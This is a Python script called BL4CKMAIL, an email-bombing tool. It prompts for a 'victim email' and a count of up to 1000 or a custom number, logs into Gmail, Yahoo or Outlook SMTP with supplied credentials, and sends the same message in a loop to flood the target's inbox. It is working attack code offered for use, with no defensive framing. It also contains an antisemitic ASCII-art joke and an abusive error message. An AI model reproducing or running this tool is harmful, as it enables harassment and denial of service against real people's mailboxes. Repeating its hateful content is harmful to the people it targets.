import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.YELLOW + '  [BL4CKMAIL v1.1]')
    print(bcolors.YELLOW + '[ made with python v3.6.5 ]')
    print(bcolors.YELLOW + '''
            __________
          _/##########\_             ____________________
        _/##############\_            |__)|  /_| /   |_/
       /##################\           |__)|__  | \__ | \ 
      |####################|          /'\,/'\ ,---, ; |
      |##/  $\######/  $\##|          |  |  | |___| | |
      \##\   /######\   /##/         _|_____|_|___|_|_|__
      |####################|
       \########[|]#######/   "C0RRUPT S0CIETY, LEAVE N0 SURVIV0RS"
        |################|
        |####/#######\###|           Created By: BLACKRA1N
        # ###\###### / ###
         #\_# | ### | #_/#
         ### # ##### ### # 
         ##  ###  # #  #
          #    #  # ##  #
          #   #        ##
         #        #    #
    ''')
class BL4CKMAIL:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n[Loading Program...]')
            print(bcolors.RED + '\n[BL4CKMAIL Succesfully Loaded]')
            self.target = str(input(bcolors.GREEN + 'Set victim email --> '))
            self.mode = int(input(bcolors.GREEN + 'Set bomb amount (1,2,3,4) - 1:(1000) 2:(500) 3:(100) 4:(custom) --> '))
            if int(self.mode) > int(6) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. Fuck your mom.')
                sys.exit(1)
            if int(self.mode) == int(5):
                print('''
                    _________________
                  _/                 \_
    /\_/\       _/      Hey I'm        \_
   /     \     /     Georgie the Jew!    \ 
  | $---$ |  <:        I did nazi         |
   \__'__/     \_      you there!       _/
   ___|___       \_                   _/
  /   |   \        \_________________/
     /|\ 
    / ; \ 
   /     \                              
                 ''')   
        except Exception as e:
            print(f'ERROR: {e}')
    def bomb(self):
        try:
            print(bcolors.RED + '\n[SETTING UP BOMBS]')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(100)
            else:
                self.amount = int(input(bcolors.GREEN + 'Custom amount --> '))
            print(bcolors.RED + f'\n[Now using setting {self.mode} with {self.amount} emails]')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n[SET EMAIL]')
            self.server = str(input(bcolors.GREEN + 'Enter mail server | or set the bombs with premade options (1:Gmail 2:Yahoo 3:Outlook) --> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number --> '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter sender address --> '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter sender password --> '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject --> '))
            self.message = str(input(bcolors.GREEN + 'Enter message --> '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'{self.count} Bomb(s) Deployed...')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n[Bombing Victim]')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n[MISSION SUCCESFUL! ALL BOMBS DEPLOYED]')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = BL4CKMAIL()
    bomb.bomb()
    bomb.email()
    bomb.attack()
